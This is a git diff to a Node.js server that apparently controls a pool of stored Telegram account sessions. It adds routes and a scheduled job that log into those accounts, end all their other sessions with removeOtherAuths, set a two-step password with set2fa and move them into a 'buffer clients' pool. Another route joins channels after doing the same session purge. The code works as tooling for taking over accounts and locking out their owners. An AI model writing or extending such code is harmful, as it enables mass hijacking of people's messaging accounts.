@@ -115,6 +115,7 @@ try {
   })
 
   schedule.scheduleJob('test3', ' 25 2 * * * ', 'Asia/Kolkata', async () => {
+    await checkBufferClients()
     for (const value of userMap.values()) {
       try {
         const now = new Date();
@@ -232,6 +233,14 @@ app.get('/exitacc', async (req, res, next) => {
   //
 });
 
+app.get('/checkBufferClients', async (req, res, next) => {
+  checkerclass.getinstance()
+  res.send('Checking Buffer Clients');
+  next();
+}, async (req, res) => {
+  await checkBufferClients();
+});
+
 app.get('/processUsers/:limit/:skip', async (req, res, next) => {
   res.send("ok")
   next();
@@ -247,14 +256,14 @@ app.get('/processUsers/:limit/:skip', async (req, res, next) => {
     if (cli) {
       console.log(document.mobile, " :  true");
       const lastActive = await client.getLastActiveTime();
-      const date = new Date(lastActive * 1000);
+      const date = new Date(lastActive * 1000).toISOString().split('T')[0];
       const me = await client.getMe()
       await db.updateUser(document, { msgs: cli.msgs, totalChats: cli.total, lastActive, date, tgId: me.id.toString(), lastUpdated: new Date().toISOString().split('T')[0] });
       await client?.disconnect(document.mobile);
       deleteClient()
     } else {
       console.log(document.mobile, " :  false");
-      await db.deleteUser(document, { msgs: cli });
+      await db.deleteUser(document);
     }
   }
   console.log("finished")
@@ -723,6 +732,28 @@ app.get('/joinchannels/:number/:limit/:skip', async (req, res, next) => {
         await client.removeOtherAuths();
         await client.joinChannels(resp);
       } else {
+      }
+    }
+  } catch (error) {
+    console.log("Some Error: ", error.code)
+  }
+});
+
+app.get('/set2fa/:number', async (req, res, next) => {
+  res.send("Setting 2FA");
+  next();
+}, async (req, res) => {
+  try {
+    const number = req.params?.number;
+    const db = ChannelService.getInstance();
+    const user = await db.getUser({ mobile: number });
+    if (!hasClient(user.mobile)) {
+      const cli = await createClient(user.mobile, user.session, false);
+      const client = await getClient(user.mobile);
+      if (cli) {
+        await client.set2fa();
+      } else {
+        console.log("Client Does not exist!")
       }
     }
   } catch (error) {
@@ -1402,5 +1433,70 @@ async function getData() {
     </div>`
   );
 
+}
+let goodIds = [];
+let badIds = [];
+async function checkBufferClients() {
+  const db = await ChannelService.getInstance();
+  const clients = await db.readBufferClients();
+  goodIds = [];
+  badIds = [];
+  if (clients.length < 5) {
+    for (let i = 0; i < 5 - clients.length; i++) {
+      badIds.push(1)
+    }
+  }
+  for (const document of clients) {
+    console.log(document)
+    const cli = await createClient(document.mobile, document.session);
+    if (cli) {
+      const client = await getClient(document.mobile);
+      const hasPassword = await client.hasPassword();
+      if (!hasPassword) {
+        badIds.push(document.mobile);
+        await db.deleteBufferClient(document);
+        await client.disconnect();
+      } else {
+        console.log(document.mobile, " :  ALL Good");
+        goodIds.push(document.mobile)
+        deleteClient()
+      }
+    } else {
+      console.log(document.mobile, " :  false");
+      badIds.push(document.mobile);
+      await db.deleteBufferClient(document)
+      await db.deleteUser(document);
+    }
+  }
+  console.log(badIds, goodIds);
+  const cursor = await db.getNewBufferClients(goodIds);
+  await set2faToUSers(cursor, 0);
+}
+
+async function set2faToUSers(cursor, index) {
+  const db = await ChannelService.getInstance();
+  while (badIds.length > 0) {
+    if (cursor.hasNext()) {
+      const document = await cursor.next();
+      const cli = await createClient(document.mobile, document.session);
+      if (cli) {
+        const client = await getClient(document.mobile);
+        const hasPassword = await client.hasPassword();
+        console.log("hasPassword: ", hasPassword)
+        if (!hasPassword) {
+          await client.removeOtherAuths();
+          await client.set2fa();
+          console.log("Inserting Document");
+          await db.insertInBufferClients(document);
+          console.log("waiting for setting 2FA");
+          await sleep(25000);
+          await client.disconnect();
+          badIds.pop()
+        }
+      } else {
+        await db.deleteUser(document);
+      }
+    }
+  }
 }
 
